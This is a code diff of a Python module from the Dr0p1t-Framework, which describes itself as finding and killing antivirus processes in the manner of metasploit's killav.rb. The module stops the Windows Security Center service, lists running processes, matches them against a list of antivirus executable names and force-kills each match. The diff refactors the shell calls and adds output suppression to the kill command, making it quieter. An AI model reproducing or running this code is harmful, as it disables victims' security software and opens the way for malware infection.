@@ -1,9 +1,10 @@
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 #This module aims to find the antivirus process and kill it like killav.rb in metasploit
 #Start
+
 def F2058():
-    x=subprocess.Popen('net stop "Security Center"',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-    avs= [
+	x=get_output('net stop "Security Center" ')
+	avs= [
   'a2adguard.exe',
   'a2adwizard.exe',
   'a2antidialer.exe',
@@ -239,16 +240,16 @@ def F2058():
   'zlclient.exe'
 ]
 
-    processes=subprocess.Popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode()
-    ps=[]
-    for i in processes.split(" "):
-        if ".exe" in i:
-            ps.append(i.replace("K\n","").replace("\n",""))
+	processes=get_output('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="')
+	ps=[]
+	for i in processes.split(" "):
+		if ".exe" in i:
+			ps.append(i.replace("K\n","").replace("\n",""))
 
-    for av in avs:
-        for p in ps:
-            if p==av:
-                #killing off av variable
-                subprocess.Popen( "TASKKILL /F /IM \"{}\"".format(p) ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	for av in avs:
+		for p in ps:
+			if p==av:
+				#killing off av variable
+				subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
 F2058()
